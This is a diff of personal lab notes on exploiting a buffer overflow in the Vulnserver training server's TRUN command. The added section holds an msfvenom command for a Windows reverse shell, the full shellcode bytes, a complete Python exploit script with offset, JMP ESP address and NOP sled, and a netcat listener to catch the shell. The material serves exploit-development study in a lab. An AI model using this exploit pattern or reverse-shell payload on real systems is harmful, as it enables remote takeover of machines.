@@ -379,7 +379,7 @@ Back to Kali to write the actual expoit
 the address has to be written backwards (little indian)
 Because the low memory byte is stored in the lowest adress in x64 architecture and the high order byte is the highest address
 
-    #!/user/bin/python3
+    #!/user/bin/python
     import socket
 
     vulnserverHost = "192.168.178.60"
@@ -389,7 +389,7 @@ Because the low memory byte is stored in the lowest adress in x64 architecture a
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         connect = s.connect((vulnserverHost, vulnserverDefaultPort))
-        s.send(('TRUN /.:/' + shellcode))
+        s.send('TRUN /.:/' + shellcode)
     except:
         print("check debugger")
     finally:
@@ -402,7 +402,98 @@ Back to Immunity Debugger we need to find the JMP ESP.
 
 That should bring the FFE4 - JMP ESP. It is needed to test that.
 Select the live press F2 to create a Breakpoint in Immunity Debugger.
-Now try to run the module code in kali.
+
+*!In order to work properly the module has to be executed in python2.7 ad probably on console*
+
+Python3 causes random signs to show up in the EIP (C2) that will destroy the return value.
+
+    EIP 625011AF essfunc.625011AF 
+
+should be inside the Debug registers
+
+**Generate Shellcode & Gaining Root**
+
+*generate the shellcode*
+
+In kali use msfvenom to generate shellcode
+
+    msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00"
+
+    EXITFUNC - for stability#
+    -f c - generate c shellcode
+    -a x86 - for architecture
+    -b - bad characters (add as collected in former section) here only NULL byte is bad
+    
+Maybe the payload is to big that has to be checked here.
+
+*Write the exploit*
+
+With that shellcode the exploit has to be written
+
+    #!/user/bin/python
+    import socket
+
+    vulnserverHost = "192.168.178.60"
+    vulnserverDefaultPort = 9999
+
+    exploit = (
+        "\xba\x72\xc2\xd0\x94\xd9\xc8\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
+        "\x52\x31\x57\x12\x03\x57\x12\x83\x9d\x3e\x32\x61\x9d\x57\x31"
+        "\x8a\x5d\xa8\x56\x02\xb8\x99\x56\x70\xc9\x8a\x66\xf2\x9f\x26"
+        "\x0c\x56\x0b\xbc\x60\x7f\x3c\x75\xce\x59\x73\x86\x63\x99\x12"
+        "\x04\x7e\xce\xf4\x35\xb1\x03\xf5\x72\xac\xee\xa7\x2b\xba\x5d"
+        "\x57\x5f\xf6\x5d\xdc\x13\x16\xe6\x01\xe3\x19\xc7\x94\x7f\x40"
+        "\xc7\x17\x53\xf8\x4e\x0f\xb0\xc5\x19\xa4\x02\xb1\x9b\x6c\x5b"
+        "\x3a\x37\x51\x53\xc9\x49\x96\x54\x32\x3c\xee\xa6\xcf\x47\x35"
+        "\xd4\x0b\xcd\xad\x7e\xdf\x75\x09\x7e\x0c\xe3\xda\x8c\xf9\x67"
+        "\x84\x90\xfc\xa4\xbf\xad\x75\x4b\x6f\x24\xcd\x68\xab\x6c\x95"
+        "\x11\xea\xc8\x78\x2d\xec\xb2\x25\x8b\x67\x5e\x31\xa6\x2a\x37"
+        "\xf6\x8b\xd4\xc7\x90\x9c\xa7\xf5\x3f\x37\x2f\xb6\xc8\x91\xa8"
+        "\xb9\xe2\x66\x26\x44\x0d\x97\x6f\x83\x59\xc7\x07\x22\xe2\x8c"
+        "\xd7\xcb\x37\x02\x87\x63\xe8\xe3\x77\xc4\x58\x8c\x9d\xcb\x87"
+        "\xac\x9e\x01\xa0\x47\x65\xc2\xc5\x97\x67\x14\xb2\x95\x67\x09"
+        "\x1e\x13\x81\x43\x8e\x75\x1a\xfc\x37\xdc\xd0\x9d\xb8\xca\x9d"
+        "\x9e\x33\xf9\x62\x50\xb4\x74\x70\x05\x34\xc3\x2a\x80\x4b\xf9"
+        "\x42\x4e\xd9\x66\x92\x19\xc2\x30\xc5\x4e\x34\x49\x83\x62\x6f"
+        "\xe3\xb1\x7e\xe9\xcc\x71\xa5\xca\xd3\x78\x28\x76\xf0\x6a\xf4"
+        "\x77\xbc\xde\xa8\x21\x6a\x88\x0e\x98\xdc\x62\xd9\x77\xb7\xe2"
+        "\x9c\xbb\x08\x74\xa1\x91\xfe\x98\x10\x4c\x47\xa7\x9d\x18\x4f"
+        "\xd0\xc3\xb8\xb0\x0b\x40\xd8\x52\x99\xbd\x71\xcb\x48\x7c\x1c"
+        "\xec\xa7\x43\x19\x6f\x4d\x3c\xde\x6f\x24\x39\x9a\x37\xd5\x33"
+        "\xb3\xdd\xd9\xe0\xb4\xf7")
+
+    shellcode = ("A" * 2003) + "\xaf\x11\x50\x62" + "\x90" * 32 + exploit
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect = s.connect((vulnserverHost, vulnserverDefaultPort))
+        s.send('TRUN /.:/' + shellcode)
+    except:
+        print("check debugger")
+    finally:
+        s.close()
+
+ 
+Add \x90*32 (for no operation = NOP) as padding so return won't interfer with the exploit code.
+The CPU will just forward over NOP in the Stack until it finds the next suitable instruction
+
+*Execute*
+
+Setup a Netcat listening port.
+
+    nc -nvlp 4444
+
+then run the exploit and trigger the reverse shell
+
+    whoami can find out well who is connected
+
+
+
+
+
+
+
+
 
 
 
